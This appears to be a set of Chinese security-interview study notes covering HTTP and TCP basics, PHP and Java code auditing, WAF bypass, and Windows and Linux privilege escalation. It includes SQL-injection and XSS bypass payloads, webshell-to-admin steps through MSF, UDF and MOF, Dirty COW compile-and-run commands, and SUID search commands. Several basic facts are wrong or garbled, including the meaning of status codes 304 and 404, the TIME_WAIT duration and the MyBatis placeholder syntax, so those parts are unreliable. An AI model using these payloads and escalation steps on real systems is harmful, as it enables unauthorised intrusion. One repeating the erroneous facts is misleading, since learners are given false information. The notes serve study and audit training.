<h4 id="h:5967502d-93c6-4627-bf8b-4452be16c312">http请求过程：</h4>
<div class="outline-text-4" id="text-h:5967502d-93c6-4627-bf8b-4452be16c312">
<ol class="org-ol">
<li>建立TCP链接（通过TCP三次握手与服务器端建立连接）</li>
<li>浏览器向服务器发送请求</li>
<li>浏览器发送请求头信息</li>
<li>服务器应答版本号和协议状态码</li>
<li>服务器发送应答头信息</li>
<li>服务器向浏览器发送数据</li>
<li>服务器关闭TCP链接</li>
</ol>
</div>
</div>
<div id="outline-container-h:58c0e529-8c14-4a69-82cf-6394083580e9" class="outline-4">
<h4 id="h:58c0e529-8c14-4a69-82cf-6394083580e9">状态码：</h4>
<div class="outline-text-4" id="text-h:58c0e529-8c14-4a69-82cf-6394083580e9">
<ol class="org-ol">
<li>200 数据数据请求成功</li>
<li>304表示页面重定向</li>
<li>404 表示请求数据成功但是页面丢失</li>
<li>502 表示服务器处理失败</li>
</ol>
</div>
</div>
<div id="outline-container-h:0e46d619-032d-4474-a77e-8d58433dbc25" class="outline-4">
<h4 id="h:0e46d619-032d-4474-a77e-8d58433dbc25">三次握手</h4>
<div class="outline-text-4" id="text-h:0e46d619-032d-4474-a77e-8d58433dbc25">
<ol class="org-ol">
<li>客户端向服务端发送SYN包（其中包含端口号和初始序列号）之后进入syn发送状态；</li>
<li>服务端收到SYN包后确认客户端的SYN，同时向客户端发送SYN+ACK包（其中包含 确认号 和 服务端的初始序列号）， 之后进入syn收到状态；</li>
<li>客户端向服务端发送ACK包，发送完毕之后，客户端和服务端进入建立链接状态，开始传送数据</li>
</ol>

<p>
SYN：同步序列号，用于建立会话连接
</p>

<p>
Seq：初始化序列号
</p>

<p>
ACK：确认号，对已接收的数据包进行确认。只有当ACK=1时,确认号才有效，当ACK=0时，确认号无效
</p>

<p>
FIN：结束
</p>
</div>
</div>
<div id="outline-container-h:2790a4f8-ca47-4ac8-8242-d190d0fddf1c" class="outline-4">
<h4 id="h:2790a4f8-ca47-4ac8-8242-d190d0fddf1c">为什么是三次，不是两次？四次？</h4>
<div class="outline-text-4" id="text-h:2790a4f8-ca47-4ac8-8242-d190d0fddf1c">
<ol class="org-ol">
<li>为了防止旧的重复连接初始化造成混乱（主要原因）</li>
<li>三次握手才可以同步双方的初始序列号</li>
<li>三次握手才可以避免资源浪费</li>
</ol>
</div>
</div>
<div id="outline-container-h:fa1148e4-0333-408c-bddc-20ead2dfa54f" class="outline-4">
<h4 id="h:fa1148e4-0333-408c-bddc-20ead2dfa54f">四次挥手</h4>
<div class="outline-text-4" id="text-h:fa1148e4-0333-408c-bddc-20ead2dfa54f">
<ol class="org-ol">
<li>客户端向服务端发送FIN数据包，请求关闭连接。自身进入等待结束连接状态</li>
<li>服务端向客户端发送ACK确认报文，同时进入关闭等待状态</li>
<li>服务端向客户端发送FIN请求数据包</li>
<li>客户端向服务端发送ACK确认数据包，进入等待状态，这个阶段将持续2秒后关闭</li>
</ol>
</div>
</div>
<div id="outline-container-h:09f6bf70-2277-4ce9-be9a-b28744a9f1ce" class="outline-4">
<h4 id="h:09f6bf70-2277-4ce9-be9a-b28744a9f1ce">为什么建立连接协议是三次握手，而关闭连接却是四次握手呢</h4>
<div class="outline-text-4" id="text-h:09f6bf70-2277-4ce9-be9a-b28744a9f1ce">
<p>
因为当服务端收到SYN报文的建立连接请求后，它可以把ACK和SYN（ACK起应答作
用，而SYN起同步作用）放在一个报文里来发送。但关闭连接时，当收到对方的
FIN报文时，它仅仅表示对方没有数据发送给你了；但未必你所有的数据都全部
发送给对方了，所以当你还需要发送一些数据给对方之后，再发送FIN报文给对
方来表示你同意可以关闭连接了，所以这里的ACK报文和FIN报文多数情况下都是
分开发送的
</p>
</div>
</div>
<div id="outline-container-h:834039c6-618b-4e0a-9100-240a3c7c5271" class="outline-4">
<h4 id="h:834039c6-618b-4e0a-9100-240a3c7c5271">分块传输为什么可以绕过waf</h4>
<div class="outline-text-4" id="text-h:834039c6-618b-4e0a-9100-240a3c7c5271">
<p>
因为waf一般是对HTTP数据包，或者关键词进行过滤的，启用分块传输之后，关键词由于换行符等干扰，并没有将其组成完整的HTTP数据包。所以可以绕过WAF
</p>
</div>
</div>
</div>
</section>
<section id="outline-container-h:906e31f1-05b7-4d52-ba2c-4def8f3ca208" class="outline-2">
<h2 id="h:906e31f1-05b7-4d52-ba2c-4def8f3ca208">进阶-代码审计及CVE面试</h2>
<div class="outline-text-2" id="text-h:906e31f1-05b7-4d52-ba2c-4def8f3ca208">
</div>
<div id="outline-container-h:9104e8c7-34f3-4e2f-ac40-8bad9aae584a" class="outline-3">
<h3 id="h:9104e8c7-34f3-4e2f-ac40-8bad9aae584a">代码审计</h3>
<div class="outline-text-3" id="text-h:9104e8c7-34f3-4e2f-ac40-8bad9aae584a">
</div>
<div id="outline-container-h:e0fc22a3-f9a5-4bf0-9085-10bdd0cf414a" class="outline-4">
<h4 id="h:e0fc22a3-f9a5-4bf0-9085-10bdd0cf414a">PHP代码审计</h4>
<div class="outline-text-4" id="text-h:e0fc22a3-f9a5-4bf0-9085-10bdd0cf414a">
<ul class="org-ul">
<li><p>
什么时候做代码审计
</p>

<p>
上线前做
</p></li>

<li><p>
审计流程（如何确保审计的代码的全面性）
</p>

<div class="org-src-container">
<pre class="src src-sh">1. &#26597;&#25214;&#29992;&#25143;&#36755;&#20837;
2. &#26597;&#25214;&#21361;&#38505;&#20989;&#25968;
3. &#23457;&#35745;&#19994;&#21153;&#21151;&#33021;&#65288;&#22914; &#22836;&#20687;&#19978;&#20256;/&#31995;&#32479;&#30331;&#38470;/&#25991;&#20214;&#19979;&#36733;&#65289;

<span style="color: #483d8b;">source</span>&#65288;&#29992;&#25143;&#36755;&#20837;&#28857;&#65289;-&#8212;&gt; sink(&#28431;&#27934;&#20135;&#29983;&#28857;)
&#22914;&#26524;&#19968;&#20010;source&#33021;&#21040;&#36798;&#19968;&#20010;sink&#37027;&#23601;&#26159;&#26377;&#28431;&#27934;
&#22914;&#26524;&#19968;&#20010;&#29992;&#25143;&#36755;&#20837;&#26368;&#32456;&#20256;&#23548;&#21040;&#20102;&#19968;&#20010;&#26377;&#28431;&#27934;&#30340;&#20989;&#25968;&#19978;&#65292;&#37027;&#23601;&#26159;&#26377;&#28431;&#27934;
</pre>
</div></li>

<li><p>
拿到一个项目之后流程
</p>

<div class="org-src-container">
<pre class="src src-sh">&#38750;&#21069;&#21518;&#31471;&#20998;&#31163;&#65288;&#24456;&#23569;&#20102;&#65289;&#65306;
1. &#25214;&#20837;&#21475; -&gt; index.php
2. &#26597;&#30475;&#20837;&#21475; -&gt; &#20840;&#23616;&#25628;&#32034; $<span style="color: #a0522d;">_POST</span>/$<span style="color: #a0522d;">_GET</span>
3. &#26597;&#25214;&#21361;&#38505;&#20989;&#25968;&#65306;exec/mysqli_query

&#21069;&#21518;&#31471;&#20998;&#31163;&#65288;&#27809;&#26377;&#39029;&#38754;&#65289;&#65306;
1. &#25214;&#25509;&#21475;
</pre>
</div></li>

<li><p>
php危险函数：
</p>

<div class="org-src-container">
<pre class="src src-sh">sql&#27880;&#20837;&#65306;mysqli_query/$<span style="color: #a0522d;">mysqli</span>-&gt;query
&#21629;&#20196;&#25191;&#34892;&#65306;system/exec/passthru/shell_exec/popen/proc_open/pcntl_exec
&#20195;&#30721;&#27880;&#20837;&#65306;eval/assert/preg_replace/call_user_func/call_user_func_array/create_function
&#25991;&#20214;&#21253;&#21547;&#65306;require(&#20572;&#27490;)/require_once/include&#65288;&#32487;&#32493;&#65289;/include_once
&#25991;&#20214;&#19978;&#20256;&#65306;move_uploaded_file
&#21453;&#24207;&#21015;&#21270;&#65306;unserialize

mail&#20989;&#25968;&#65306;&#36890;&#36807;&#12304;-X&#12305;&#25351;&#23450;log&#25991;&#20214;&#35760;&#24405;&#37038;&#20214;&#27969;&#37327;&#65292;mail($<span style="color: #a0522d;">to</span>, $<span style="color: #a0522d;">subject</span>, $<span style="color: #a0522d;">message</span>, $<span style="color: #a0522d;">headers</span>, $<span style="color: #a0522d;">options</span>);&#23454;&#38469;&#21487;&#20197;&#36798;&#21040;&#20889;&#25991;&#20214;&#30340;&#25928;&#26524;&#65288;&#37325;&#28857;&#20851;&#27880;&#31532;&#20116;&#20010;&#21442;&#25968;&#26159;&#21542;&#29992;&#25143;&#21487;&#25511;&#65289;
&#20462;&#22797;&#65306;&#20351;&#29992;&#36807;&#28388;&#20989;&#25968; escapeshellcmd(), escapeshellarg() ,&#36807;&#28388;&#21644;&#36716;&#20041;&#36755;&#20837;&#20013;&#30340;&#29305;&#27530;&#23383;&#31526;
</pre>
</div></li>

<li><p>
php原生过滤函数
</p>

<div class="org-src-container">
<pre class="src src-sh">1.escapeshellarg&#65306;&#20256;&#20837;&#21442;&#25968;&#28155;&#21152;&#21333;&#24341;&#21495;&#24182;&#36716;&#20041;&#21407;&#26377;&#21333;&#24341;&#21495; &#29992;&#20110;&#38450;&#27490;&#21629;&#20196;&#27880;&#20837;
2.addslashes&#65306;&#22312;&#39044;&#23450;&#20041;&#33258;&#31526;&#20043;&#21069;&#28155;&#21152;&#21453;&#26012;&#26464;&#65292;&#21487;&#29992;&#20110;&#38450;&#27490;SQL&#27880;&#20837;
3.htmlspecialchars &#21644; htmlentities &#23558;&#29305;&#27530;&#23383;&#31526;&#36716;&#20041;&#25104;html&#23454;&#20307; &#21487;&#29992;&#20110;&#38450;&#27490;XSS
4.PDO::quote &#36716;&#20041;&#29305;&#27530;&#23383;&#31526; &#24182;&#28155;&#21152;&#24341;&#21495;
5.PDO::prepare &#39044;&#22788;&#29702;SQL&#35821;&#21477; &#26377;&#25928;&#38450;&#27490;SQL&#27880;&#20837; (&#25512;&#33616;)
<span style="color: #0000ff;">6.intval</span>($<span style="color: #a0522d;">input</span>) floatval() floatval() floor() (int)$<span style="color: #a0522d;">input</span> num+***<span style="color: #8b2252;">\*</span>0<span style="color: #8b2252;">\*</span>*** &#23558;&#36755;&#20837;&#24378;&#21046;&#36716;&#25442;&#20026;&#25972;&#25968;/&#28014;&#28857; &#24120;&#35265;&#20110;&#38450;&#27490;SQL&#27880;&#20837;
</pre>
</div></li>
</ul>
</div>
<div id="outline-container-h:1bf7b712-b96e-4ba2-85ea-ccd491149c39" class="outline-5">
<h5 id="h:1bf7b712-b96e-4ba2-85ea-ccd491149c39">thinkphp框架代码审计</h5>
<div class="outline-text-5" id="text-h:1bf7b712-b96e-4ba2-85ea-ccd491149c39">
<ul class="org-ul">
<li>如何识别thinkphp框架

<ol class="org-ol">
<li>看代码里面是否有think文件</li>
<li>看代码特征里面是否有think</li>
<li>看composer.json里面是否有think</li>
</ol></li>

<li>thinkphp框架审计

<ol class="org-ol">
<li>controller 里面的参数是用户输入，直接审就行</li>
<li>route-&gt;controller-&gt;查找用户输入</li>
</ol></li>

<li><p>
查找的关键函数
</p>

<p>
sql注入：Query/execute/DB::(查看是否有拼接用户输入，并且是字符串；如果是【get.id/d】那就没有注入，因为/d是强制转换为整形
</p>

<p>
文件上传：move_uploaded_file
</p>

<p>
命令执行：shell_exec
</p></li>

<li>硬编码漏洞

<ol class="org-ol">
<li><p>
会引发文件包含
</p>

<p>
硬编码漏洞在php里是一个很大的问题，但是java就不是
</p></li>
</ol></li>

<li>thinkphp框架审计

<ol class="org-ol">
<li>controller 里面的参数是用户输入，直接审就行</li>
<li>route-&gt;controller-&gt;查找用户输入</li>
<li>查找用户输入：Request::instance(自动识别是get，post，put)/input</li>
</ol></li>
</ul>
</div>
</div>
</div>
<div id="outline-container-h:fb940cda-b2cb-480a-bb5c-fa4b3c236493" class="outline-4">
<h4 id="h:fb940cda-b2cb-480a-bb5c-fa4b3c236493">JAVA代码审计</h4>
<div class="outline-text-4" id="text-h:fb940cda-b2cb-480a-bb5c-fa4b3c236493">
</div>
<div id="outline-container-h:384a1075-7aac-4923-ac7d-7fae6b26a9d6" class="outline-5">
<h5 id="h:384a1075-7aac-4923-ac7d-7fae6b26a9d6">SQL注入审计</h5>
<div class="outline-text-5" id="text-h:384a1075-7aac-4923-ac7d-7fae6b26a9d6">
</div>
<ul class="org-ul">
<li><a id="h:4ab27c9a-5f87-40ea-adc9-b8d16069f5da"></a>spring框架 （java代码审计思路 如何找用户输入）<br>
<div class="outline-text-6" id="text-h:4ab27c9a-5f87-40ea-adc9-b8d16069f5da">
<p>
正向查找：
</p>

<p>
找用户输入：
</p>

<ol class="org-ol">
<li>Controller</li>
<li>注解 @Get/Post/Request Mapping</li>
<li>查看用户输入是否拼接</li>
</ol>

<p>
反向查找：
</p>

<p>
1.找执行sql语句的方法：
</p>

<p>
execute；executeQuery；executeUpdate；executeBatch
</p>

<p>
2.查看有没有拼接用户输入
</p>
</div>
</li>
</ul>
</div>
<div id="outline-container-h:a8df2e75-01f3-4b6c-b9f2-3e3ae432333d" class="outline-5">
<h5 id="h:a8df2e75-01f3-4b6c-b9f2-3e3ae432333d">ORM 框架</h5>
<div class="outline-text-5" id="text-h:a8df2e75-01f3-4b6c-b9f2-3e3ae432333d">
</div>
<ul class="org-ul">
<li><a id="h:80d711ab-368d-4e79-bf09-360b86f5181c"></a>Hibernate框架<br>
<div class="outline-text-6" id="text-h:80d711ab-368d-4e79-bf09-360b86f5181c">
<p>
如何查看是否有SQL注入：
1.查找执行函数 createQuery
2.看SQL语句是否使用+号拼接
</p>

<p>
如何预编译：
先用占位符，set内容 绑定参数
</p>
</div>
</li>
<li><a id="h:3d55e21f-2097-4110-a869-79556a363b9c"></a>MyBatis框架（企业中最常用的）<br>
<div class="outline-text-6" id="text-h:3d55e21f-2097-4110-a869-79556a363b9c">
<p>
如何查看是否有SQL注入：
</p>

<ol class="org-ol">
<li><p>
在XML文件中搜索 * 或者 $
</p>

<p>
select * from Blog where id = ${id}   * 拼接（有漏洞）
</p>

<p>
select * from Blog where id = *{id}   * 预编译（无漏洞）
</p></li>

<li>查看是否int类型，如果是string并且用$拼接，那就有SQL注入</li>
</ol>

<p>
使用 like 如何预编译：要使用concat
</p>

<p>
select * from user where name like concat('%', *{name}, '%')
</p>

<p>
不能使用*号做预编译的：
</p>

<div class="org-src-container">
<pre class="src src-sh">&#20219;&#20309;&#24517;&#39035;&#20351;&#29992;&#24341;&#21495;&#30340;&#22320;&#26041;&#37117;&#19981;&#33021;&#29992;&#65292;&#20363;&#22914;&#65306;order by,table,limit,offset
&#12304;limit,offset&#12305;&#20462;&#22797;&#24314;&#35758;&#65306;&#24378;&#21046;&#20351;&#29992;&#25968;&#23383;&#22411;
&#12304;order by&#12305;&#20462;&#22797;&#24314;&#35758;&#65306;&#24378;&#21046;&#20351;&#29992;&#25968;&#23383;&#22411;+&#25968;&#23383;&#21644;&#23383;&#27573;&#30340;&#26144;&#23556;
&#12304;order by&#12305;&#20462;&#22797;&#24314;&#35758;&#65306;&#21152;&#21453;&#24341;&#21495;
</pre>
</div>
</div>
</li>
<li><a id="h:5618f48f-7649-4ecb-bda3-1600f39ef123"></a>JdbcTemplate<br>
<div class="outline-text-6" id="text-h:5618f48f-7649-4ecb-bda3-1600f39ef123">
<p>
审计的关键字
</p>

<div class="org-src-container">
<pre class="src src-sh">java.sql.Connection.prepareStatement
java.sql.ResultSet.getObject
<span style="color: #a020f0;">select</span>
insert
java.sql.Statement.executeUpdate
java.sql.Statement.addBatch
java.sql.Statement.executeQuery
java.sql.Statement.execute
execute
executestatement
createStatement
java.sql.ResultSet.getString
executeQuery
jdbc
delete
update
java.sql.Connection.prepareCall
</pre>
</div>
</div>
</li>
</ul>
</div>
<div id="outline-container-h:645dceb4-5e7b-48d1-bca2-472a6955e1db" class="outline-5">
<h5 id="h:645dceb4-5e7b-48d1-bca2-472a6955e1db">FastJson</h5>
<div class="outline-text-5" id="text-h:645dceb4-5e7b-48d1-bca2-472a6955e1db">
<p>
审计方法：
</p>

<p>
看pom.xml文件里面的版本，把所有有漏洞的版本查一遍，一般用自动化工具识别
</p>
</div>
</div>
<div id="outline-container-h:879c7bac-0394-4335-8442-a5526d555239" class="outline-5">
<h5 id="h:879c7bac-0394-4335-8442-a5526d555239">注意问题</h5>
<div class="outline-text-5" id="text-h:879c7bac-0394-4335-8442-a5526d555239">
<ul class="org-ul">
<li><p>
使用了预编译就一定没有sql注入吗
</p>

<p>
如果在执行【预编译】之前就已经拼接了用户输入，那即使用了预编译也是有sql注入的
</p>

<p>
【PreparedStatement】 预编译
</p></li>

<li><p>
SQL注入修复（占位符）：
</p>

<p>
两种形式：
</p>

<ol class="org-ol">
<li>？（问号）</li>
<li>：name（冒号+变量名）</li>
</ol></li>
</ul>
</div>
</div>
<div id="outline-container-h:ab3c684c-6d7d-4793-8608-6e4458e591b1" class="outline-5">
<h5 id="h:ab3c684c-6d7d-4793-8608-6e4458e591b1">工具-Cobra</h5>
<div class="outline-text-5" id="text-h:ab3c684c-6d7d-4793-8608-6e4458e591b1">
<p>
ssh登录虚拟机
</p>

<div class="org-src-container">
<pre class="src src-sh">1. &#24320;&#21551;sshd&#65306;service sshd start
2. &#26597;&#30475;sshd&#26159;&#21542;&#26377;&#21551;&#21160;&#25104;&#21151;&#65306;ps aux|grep sshd
3. &#26597;&#30475;&#34394;&#25311;&#26426;&#30340;IP&#22320;&#22336;
4. &#22312;&#20027;&#26426;&#30005;&#33041;&#36755;&#20837;&#21629;&#20196;&#65306;ssh root@&#34394;&#25311;&#26426;Ip
5. &#22914;&#26524;&#39318;&#27425;&#36830;&#25509;&#65292;&#20250;&#26377;&#25552;&#31034;&#38656;&#35201;&#36755;&#20837; yes
6. &#30005;&#33041;&#36864;&#20986;&#36830;&#25509;ssh&#65306;ctrl+D
python2 cobra.py -H 0.0.0.0 -P 8889
</pre>
</div>

<p>
启动cobra
</p>

<div class="org-src-container">
<pre class="src src-sh">1. python2 cobra.py -H 0.0.0.0 -P 8889 

&#26597;&#30475;&#36827;&#31243;&#65306;ps aux | grep cobra
&#32467;&#26463;&#36827;&#31243;&#65306;kill -9
</pre>
</div>
</div>
</div>
</div>
</div>
<div id="outline-container-h:cf55ab25-3810-4783-9b67-508353ce94e4" class="outline-3">
<h3 id="h:cf55ab25-3810-4783-9b67-508353ce94e4">DevSecOps</h3>
<div class="outline-text-3" id="text-h:cf55ab25-3810-4783-9b67-508353ce94e4">
<p>
需求 —&gt; 设计 —&gt; 开发 —&gt; 构建 —&gt; 测试 —&gt; 部署 
</p>

<p>
需求：登录框加密传输
</p>

<p>
设计：具体的加密方式
</p>

<p>
开发：IDE插件/对开发人员进行培训
</p>

<p>
构建：代码扫描
</p>

<p>
测试：黑盒扫描
</p>

<p>
将安全左移至开发阶段，并最终集成在整个生命周期中，完成敏捷化的自适应风险和信任评估
</p>
</div>
</div>
<div id="outline-container-h:52f8e7ad-69c3-4c2d-9ff1-75a0499c4750" class="outline-3">
<h3 id="h:52f8e7ad-69c3-4c2d-9ff1-75a0499c4750">绕WAF</h3>
<div class="outline-text-3" id="text-h:52f8e7ad-69c3-4c2d-9ff1-75a0499c4750">
</div>
<div id="outline-container-h:50505cd2-af8f-450c-a467-8997300a7dd0" class="outline-4">
<h4 id="h:50505cd2-af8f-450c-a467-8997300a7dd0">SQL注入绕WAF</h4>
<div class="outline-text-4" id="text-h:50505cd2-af8f-450c-a467-8997300a7dd0">
<ol class="org-ol">
<li>大小写 （unIoNSelect）</li>
<li>双写 （ununionion ==&gt; 去掉union ==&gt; union）</li>
<li>编码 （URL编码，Unicode编码，十六进制编码，其他后端会解析的编码）</li>
<li>引号：十六进制（0x7573657273）</li>
<li>关键字替换 （and=&amp;&amp; or=||）</li>
<li>空格绕过 （注释 /**/）</li>
<li>内联注释 （ <i>*! Union *</i> 结合 %0a 换行使用）
注释也可以和换行搭配使用，注释掉后面的内容，再通过换行逃逸到注释之外
test.php?id=1 /*!order*//**/%23A%0A/**/%23A%0A/*!by*//**/2</li>
<li>垃圾字符 （缓冲区溢出，超大包传输，一般WAF对数据包的长度有限制，太大的就不检测）</li>
<li>分块传输 （头部加入 Transfer-Encoding: chunked 之后，就代表这个报文采用了分块编码）</li>
<li>参数污染（给参数附上多个值，不同的服务器会取不同的值）</li>
</ol>



<p>
XSS绕WAF
</p>

<div class="org-src-container">
<pre class="src src-sh">&#21033;&#29992;svg&#26631;&#31614;&#36827;&#34892;&#32469;&#36807;; &lt;svg&gt; &#26631;&#35760;&#23450;&#20041; SVG &#22270;&#24418;&#30340;&#23481;&#22120;
&lt;svg/onload=alert(1)&gt;

base64&#32534;&#30721;&#21363;&#21487;&#32469;&#36807;


&#36807;&#28388;&#21333;&#24341;&#21495;&#65306;&#21453;&#24341;&#21495;&#32469;&#36807;
&#36807;&#28388;&#31354;&#26684;&#65306;&#27880;&#37322;&#31526;&#32469;&#36807; &lt;!-- --&gt;  //  /**/
XSS

&#8220;<span style="color: #a0522d;">OnMoUsEoVeR</span>=prompt(1)// &#36866;&#21512;&#25628;&#32034;&#26694;&#27979;&#20063;&#21487;&#20197;url&#32467;&#23614;&#27979;

&#8220;-prompt(1)-&#8220; URL&#27979;&#32467;&#23614;&#21442;&#25968;

&#8220;&gt;&lt;iMg <span style="color: #a0522d;">SrC</span>=1 <span style="color: #a0522d;">oNeRrOr</span>=prompt(1)&gt; URL&#27979;&#25554;&#20837;&#21442;&#25968;
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:0dc8b4cc-b584-4b6b-8d2a-c6da4bf6dc20" class="outline-3">
<h3 id="h:0dc8b4cc-b584-4b6b-8d2a-c6da4bf6dc20">提权</h3>
<div class="outline-text-3" id="text-h:0dc8b4cc-b584-4b6b-8d2a-c6da4bf6dc20">
</div>
<div id="outline-container-h:ca8b8b1a-6af4-4d0f-ab81-0e8a37a5dee3" class="outline-4">
<h4 id="h:ca8b8b1a-6af4-4d0f-ab81-0e8a37a5dee3">windows提权</h4>
<div class="outline-text-4" id="text-h:ca8b8b1a-6af4-4d0f-ab81-0e8a37a5dee3">
<p>
win常用提权方法
</p>

<ol class="org-ol">
<li>内核溢出漏洞提权</li>
<li>数据库提权（UDF/MOF/启动项）</li>
<li>错误的系统配置提权</li>
<li>web中间件漏洞提权</li>
<li>DLL劫持提权</li>
<li>滥用高位权限令牌提权</li>
<li>第三方软件提权</li>
<li>组策略首选项提权</li>
</ol>
</div>
<div id="outline-container-h:b60721ac-b3a8-4ace-a510-65b03f66f54e" class="outline-5">
<h5 id="h:b60721ac-b3a8-4ace-a510-65b03f66f54e">1. 内核溢出漏洞提权</h5>
<div class="outline-text-5" id="text-h:b60721ac-b3a8-4ace-a510-65b03f66f54e">
<p>
通过系统本身存在的一些漏洞，未曾打相应的补丁而暴露出来的提权方法，依托可以提升权限的EXP和它们的补丁编号，进行提升权限
</p>

<p>
本地溢出提权首先要有服务器的一个普通用户权限，攻击者通常会向服务器上传本地溢出程序，在服务器端执行，如果系统存在漏洞，那么将溢出Administrator权限。
</p>

<p>
方法：
</p>

<ol class="org-ol">
<li>先获得一个 webshell</li>
<li>使用msf生成一个exe后⻔；通过 webshell 执行该后⻔程序</li>
<li>得到一个meterpreter会话之后，查询哪些提权exp可以用</li>
<li>通过MSF利用</li>
</ol>
</div>
</div>
<div id="outline-container-h:2912aa2e-7c95-4841-b387-2524d2f19ca3" class="outline-5">
<h5 id="h:2912aa2e-7c95-4841-b387-2524d2f19ca3">2. 数据库提权</h5>
<div class="outline-text-5" id="text-h:2912aa2e-7c95-4841-b387-2524d2f19ca3">
<p>
mysql获取账号密码：
</p>

<ol class="org-ol">
<li>config 配置文件</li>
<li>sqlmap</li>
<li>暴力破解 — hydra</li>
</ol>
</div>
<ul class="org-ul">
<li><a id="h:1418f576-2f38-4d9a-83ef-96856e0e8161"></a>2.1 UDF提权 (通过mysql获得管理员权限)<br>
<div class="outline-text-6" id="text-h:1418f576-2f38-4d9a-83ef-96856e0e8161">
<ul class="org-ul">
<li><p>
原理
</p>

<p>
自定义的函数才被当作本机函数执行。在使用CREAT FUNCITON调用dll中的函
数后，mysql账号转化为system权限，从而来提权
</p>

<p>
UDF 用户自定义函数，是mysql的一个拓展接口。
</p>

<p>
用户可以通过自定义函数实现在mysql中无法方便实现的功能，其添加的新函数都可以在sql语句中调用，就像调用本机函数一样
</p></li>

<li><p>
提权的条件
</p>

<p>
mysql数据库的账号有insert和delete权限以创建和抛弃函数，如root账户
</p>

<p>
mysql版本 &lt; 5.1 , UDF导出到系统目录c:/windows/system32/
</p>

<p>
mysql版本 &gt; 5.1 ，UDF导出到安装路径MySQL\Lib\Plugin\
</p>

<p>
可以将udf.dll写入到相应目录的权限
</p></li>

<li>提权流程

<ol class="org-ol">
<li>获取webshell之后，</li>
<li>查看 config 配置信息，找到数据库账号密码，连接上数据库</li>
<li>udf提权，通过sqlmap制作dll文件</li>
<li>把dll文件通过webshell上传到 /lib/plugin 目录下 （没有目录需要自己创建）</li>
<li>create function sys_eval （自定义函数）</li>
<li>创建管理员权限的账号</li>
</ol></li>

<li><p>
防御
</p>

<p>
其实造成udf提权的原因，主要是数据库的权限太高，所以导致了利用函数的方式来命令执行，最好的预防方法，就是【调低使用权限】
</p></li>
</ul>
</div>
</li>
<li><a id="h:ac4d9f54-41b2-4234-bad9-0f202ec0ccea"></a>2.2 MOF提权<br>
<div class="outline-text-6" id="text-h:ac4d9f54-41b2-4234-bad9-0f202ec0ccea">
<ul class="org-ul">
<li><p>
原理
</p>

<p>
MOF文件每五秒就会以系统权限执行，通过mysql使用【load_file】和【into dumpfile 】将文件导入mof目录下，MOF当中有一段是vbs脚本，一般都是cmd的添加管理员用户的命令。
</p>

<p>
我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。
</p></li>

<li>流程

<ol class="org-ol">
<li>上传VB脚本至到有读写权限的目录下</li>
<li>使用 load_file 和 into dumpfile 将文件导入到mof目录下</li>
<li>执行系统命令</li>
</ol></li>

<li>提权条件

<ol class="org-ol">
<li>windows 03 及以下版本</li>
<li>mysql启动身份具有权限去读写c:/windows/system32/wbem/mof目录</li>
<li>secure-file-priv参数不为null</li>
</ol></li>
</ul>
</div>
</li>
<li><a id="h:d804bca2-87d4-492a-8375-94bc67a7fdc1"></a>2.3 启动项提权<br>
<div class="outline-text-6" id="text-h:d804bca2-87d4-492a-8375-94bc67a7fdc1">
<ul class="org-ul">
<li><p>
原理
</p>

<p>
利用mysql，将后门写入开机启动项。因为是开机自启动，写入之后，需要重启目标服务器
</p>

<p>
(这个要求mysql的权限就很高，至少是管理员权限甚至是system，可以利用一些漏洞尝试打蓝屏重启)
</p></li>
</ul>
</div>
</li>
</ul>
</div>
</div>
<div id="outline-container-h:f77bedab-8d46-4301-bce9-07dda8666d48" class="outline-4">
<h4 id="h:f77bedab-8d46-4301-bce9-07dda8666d48">linux提权</h4>
<div class="outline-text-4" id="text-h:f77bedab-8d46-4301-bce9-07dda8666d48">
<p>
获取webshell之后 上传脚本一般都上传至 /tmp目录（临时文件，具有可读写权限）
</p>
</div>
<div id="outline-container-h:d22b21e4-9452-40ba-903d-0ab217fbbaa5" class="outline-5">
<h5 id="h:d22b21e4-9452-40ba-903d-0ab217fbbaa5">内核漏洞 脏牛提权（CVE 2016-5195 ）</h5>
<div class="outline-text-5" id="text-h:d22b21e4-9452-40ba-903d-0ab217fbbaa5">
<p>
uname -a   *查看内核版本信息
</p>

<ul class="org-ul">
<li><p>
原理
</p>

<p>
linux内核的子系统在处理写时复制时产生了条件竞争漏洞，低权限用户可以利用该漏洞修改只读内存，进而执行任意代码获取Root权限。
</p></li>

<li>提权流程

<ol class="org-ol">
<li>上传提权exp：dirty.c</li>
<li>使用gcc进行编译：gcc -pthread dirty.c -o dirty -lcrypt</li>
<li>进行提权（root是随便输入的密码）：./dirty root</li>
<li>查看/etc/passwd发现多了一个用户firefart</li>
<li>su firefart，输入密码即root</li>
</ol></li>
</ul>
</div>
</div>
<div id="outline-container-h:9538c116-849d-4519-9f4d-5a68a7fd805b" class="outline-5">
<h5 id="h:9538c116-849d-4519-9f4d-5a68a7fd805b">SUID提权</h5>
<div class="outline-text-5" id="text-h:9538c116-849d-4519-9f4d-5a68a7fd805b">
<ul class="org-ul">
<li><p>
原理
</p>

<p>
SUID是Linux的一种权限机制，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。如果拥有SUID权限，那么就可以利用系统中的二进制文件和工具来进行root提权
</p>

<p>
chmod u+s filename   设置SUID位
</p>

<p>
chmod u-s filename   去掉SUID设置
</p></li>

<li><p>
️注
</p>

<p>
SUID权限仅对二进制程序有效
</p>

<p>
执行该程序必须具有x的执行权限，否则s权限并不能真正生效
</p>

<p>
本权限仅在执行该程序的过程中有效，拥有临时身份
</p>

<p>
执行者将具有该程序拥有者(owner)的权限
</p></li>

<li>提权流程

<ol class="org-ol">
<li>获取webshell</li>
<li>查找具有root权限的SUID文件</li>
<li>利用已知命令提权</li>
</ol></li>

<li><p>
已知的可用来提权的linux可行性的文件列表如下：
</p>
<div class="org-src-container">
<pre class="src src-sh">nmap
vim
find
bash
more
less
nano
cp
</pre>
</div></li>

<li><p>
查找具有root权限的SUID的文件
</p>

<div class="org-src-container">
<pre class="src src-sh">find / -user root -perm -4000 -print 2&gt;/dev/null
find / -perm -u=s -type f 2&gt;/dev/null
find / -user root -perm -4000 -exec ls -ldb {} <span style="color: #8b2252;">\;</span>
</pre>
</div></li>

<li><p>
利用find命令提权至root权限
</p>

<p>
find / -name one.php -exec "whoami" \;
</p></li>
</ul>
</div>
</div>
<div id="outline-container-h:9953dcba-1a66-4710-8b18-3570493354b7" class="outline-5">
<h5 id="h:9953dcba-1a66-4710-8b18-3570493354b7">Linux polkit 本地提权（CVE-2021-4034）</h5>
<div class="outline-text-5" id="text-h:9953dcba-1a66-4710-8b18-3570493354b7">
<p>
